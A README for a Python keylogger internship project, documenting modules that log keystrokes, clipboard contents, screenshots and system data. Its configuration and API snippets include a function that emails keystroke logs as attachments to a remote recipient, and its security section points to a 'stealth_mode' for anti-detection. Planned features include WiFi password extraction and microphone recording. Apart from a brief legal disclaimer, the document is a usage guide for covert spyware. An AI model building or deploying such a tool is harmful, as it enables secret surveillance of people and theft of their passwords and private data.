# Advanced Keylogger Application

> **⚠️ ETHICAL DISCLAIMER**: This application is for educational and authorized security testing purposes only. Unauthorized access to computer systems and monitoring of user activity is illegal in most jurisdictions. Always ensure you have explicit written permission before deploying keyloggers.

## Overview

This is a comprehensive, production-grade keylogger application developed as an internship project. It demonstrates advanced software engineering practices, including modular architecture, configuration management, logging systems, and multi-threading.

## Features

### Core Features
- ✅ **Keystroke Logging**: Captures all keystrokes including special keys (Enter, Tab, Shift, etc.)
- ✅ **Advanced Logging**: JSON/CSV export with timestamps and session tracking
- ✅ **System Monitoring**: Captures CPU, memory, disk, and network information
- ✅ **Screenshot Capture**: Takes full-screen, region, and window screenshots
- ✅ **Clipboard Tracking**: Monitors and logs clipboard changes
- ✅ **Email Alerts**: Sends periodic reports via email

### Advanced Features
- 🔧 **Configuration Management**: JSON-based configuration system
- 📊 **Session Management**: Tracks sessions with unique IDs and timestamps
- 🔄 **Multi-threading**: Non-blocking concurrent operations
- 📈 **Export Formats**: Support for TXT, JSON, and CSV formats
- 🔐 **Modular Architecture**: Clean separation of concerns
- 📝 **Comprehensive Logging**: Detailed activity logging for analysis

## Project Structure

```
PRODIGY_CS_04/
├── main.py                      # Main application entry point
├── requirements.txt             # Python dependencies
├── README.md                    # This file
├── config/
│   └── config.json             # Configuration file
├── src/
│   ├── keylogger.py            # Basic keystroke capture
│   ├── advanced_logger.py      # Advanced logging with timestamps/sessions
│   ├── system_info.py          # System information capture
│   ├── screenshot.py           # Screenshot capture
│   ├── clipboard_tracker.py    # Clipboard monitoring
│   ├── email_alert.py          # Email notification system
│   └── config_manager.py       # Configuration management
├── logs/                        # Log files directory
└── screenshots/                 # Screenshots directory
```

## Installation

### Prerequisites
- Python 3.7 or higher
- pip (Python package manager)
- Administrator/root privileges (optional, for some features)

### Setup

1. **Clone or download the project**
```bash
cd PRODIGY_CS_04
```

2. **Install dependencies**
```bash
pip install -r requirements.txt
```

3. **Configure the application**
Edit `config/config.json` to customize behavior:
```json
{
  "keylogger": {
    "enabled": true,
    "log_file": "logs/keylog.txt"
  },
  "screenshots": {
    "enabled": true,
    "capture_type": "full"
  }
  // ... more settings
}
```

## Usage

### Basic Usage
```bash
python main.py
```

### Run Specific Module
```bash
# Run keylogger only
python src/keylogger.py

# Run system info capture
python src/system_info.py

# Run screenshot capture
python src/screenshot.py

# Run clipboard tracker
python src/clipboard_tracker.py
```

### Exit Application
- Press `ESC` to stop the keylogger
- Press `Ctrl+C` to stop the entire application

## Configuration

### Configuration File: `config/config.json`

#### Keylogger Settings
```json
"keylogger": {
  "enabled": true,
  "log_file": "logs/keylog.txt",
  "capture_special_keys": true,
  "stop_key": "esc"
}
```

#### System Info Settings
```json
"system_info": {
  "enabled": true,
  "capture_interval": 300,
  "include_cpu": true,
  "include_memory": true,
  "include_disk": true,
  "include_network": true
}
```

#### Screenshot Settings
```json
"screenshots": {
  "enabled": true,
  "capture_type": "full",
  "save_directory": "screenshots",
  "periodic_capture": false,
  "capture_interval": 600
}
```

#### Email Alert Settings
```json
"email_alerts": {
  "enabled": false,
  "smtp_server": "smtp.gmail.com",
  "smtp_port": 587,
  "sender_email": "your_email@gmail.com",
  "sender_password": "your_app_password",
  "recipient_email": "recipient@example.com"
}
```

## API Reference

### Keylogger Class
```python
from src.keylogger import Keylogger

logger = Keylogger("logs/keylog.txt")
logger.start()      # Start capturing
logger.stop()       # Stop capturing
```

### Advanced Logger Class
```python
from src.advanced_logger import AdvancedLogger

logger = AdvancedLogger("logs")
logger.log_event("keystroke", "A")
logger.save_session()
stats = logger.get_session_stats()
```

### System Info Capture Class
```python
from src.system_info import SystemInfoCapture

sic = SystemInfoCapture()
cpu = sic.get_cpu_usage()
memory = sic.get_memory_usage()
disk = sic.get_disk_usage()
processes = sic.get_processes()
```

### Screenshot Capture Class
```python
from src.screenshot import ScreenshotCapture

sc = ScreenshotCapture("screenshots")
sc.capture_full_screen()
sc.capture_region((0, 0, 800, 600))
sc.capture_active_window()
```

### Clipboard Tracker Class
```python
from src.clipboard_tracker import ClipboardTracker

tracker = ClipboardTracker("logs/clipboard.txt")
tracker.start()
tracker.stop()
history = tracker.get_clipboard_history()
```

### Email Alert System Class
```python
from src.email_alert import EmailAlertSystem

email = EmailAlertSystem(
    "sender@gmail.com",
    "app_password"
)
email.send_alert(
    "recipient@example.com",
    "Subject",
    "Email body"
)
```

### Configuration Manager Class
```python
from src.config_manager import ConfigManager

config = ConfigManager("config/config.json")
log_file = config.get("keylogger.log_file")
enabled = config.is_enabled("keylogger")
config.set("keylogger.log_file", "new_path.txt")
config.save_config()
```

## Log Files

### Keystroke Log (`logs/keylog.txt`)
Raw keystroke data:
```
Hello World[ENTER]
[SHIFT][ALT]...
```

### Session Log (`logs/session_YYYYMMDD_HHMMSS.json`)
JSON format with timestamps:
```json
{
  "start_time": "2024-01-15T10:30:00",
  "session_id": "20240115_103000",
  "events": [
    {
      "timestamp": "2024-01-15T10:30:01",
      "type": "keystroke",
      "data": "H"
    }
  ]
}
```

### Clipboard Log (`logs/clipboard.txt`)
Clipboard changes:
```
[2024-01-15 10:30:00] CLIPBOARD CHANGE:
Text from clipboard
--------------------------------------------------
```

## Git History

All features have been implemented incrementally with Git commits:

```bash
git log --oneline
```

Each commit represents a new feature or enhancement.

## Advanced Usage

### Capturing Screenshots Periodically
```python
from src.screenshot import ScreenshotCapture

sc = ScreenshotCapture()
screenshots = sc.capture_periodic(
    interval=300,      # Every 5 minutes
    duration=3600      # For 1 hour
)
```

### Exporting Logs
```python
from src.advanced_logger import AdvancedLogger

logger = AdvancedLogger()
logger.save_session()
logger.export_to_csv("session_export.csv")
```

### Sending Email Reports
```python
from src.email_alert import EmailAlertSystem

email = EmailAlertSystem("your_email@gmail.com", "password")
email.send_keystroke_report(
    "recipient@example.com",
    keystroke_data,
    attachments=["logs/keylog.txt"]
)
```

## Performance Considerations

- **Memory Usage**: Multi-threaded design keeps main thread responsive
- **Disk Space**: Configure log rotation in config.json to manage disk usage
- **CPU Usage**: System monitoring interval is configurable
- **Screenshot Storage**: Large images consume disk space quickly

## Troubleshooting

### Issue: Permission Denied Error
**Solution**: Run with administrator/root privileges

### Issue: Module Not Found Error
**Solution**: Ensure all dependencies are installed:
```bash
pip install -r requirements.txt
```

### Issue: Email Not Sending
**Solution**: 
- For Gmail: Use an app-specific password
- Check SMTP settings in config.json
- Ensure internet connectivity

### Issue: Clipboard Not Tracking
**Solution**: Some applications restrict clipboard access. Install tkinter if using Linux:
```bash
sudo apt-get install python3-tk
```

## Security Considerations

1. **File Permissions**: Logs contain sensitive data - restrict access
2. **Email Security**: Use app-specific passwords, never commit real credentials
3. **Network Security**: Use HTTPS/TLS for email notifications
4. **Anti-detection**: Configure stealth_mode in general settings
5. **Legal Compliance**: Only use with explicit authorization

## Contributing

This project is part of an internship and demonstrates:
- Clean code architecture
- Comprehensive documentation
- Version control best practices
- Modular design patterns
- Error handling and logging

## Future Enhancements

- [ ] Browser history capture
- [ ] WiFi password extraction
- [ ] USB device monitoring
- [ ] Website visited logging
- [ ] Application usage tracking
- [ ] Microphone recording
- [ ] GUI dashboard
- [ ] Database backend for logs

## Resources

- [pynput Documentation](https://pynput.readthedocs.io/)
- [Pillow (PIL) Documentation](https://pillow.readthedocs.io/)
- [psutil Documentation](https://psutil.readthedocs.io/)
- [Python Email Documentation](https://docs.python.org/3/library/email.html)

## License

Educational Use Only - Prodigy InfoTech Internship Project

## Authors

- **Samson Jose**
- Prodigy InfoTech Internship Program
- Task-04: Simple Keylogger with Advanced Features

---

**Last Updated**: January 2024  
**Version**: 1.0.0
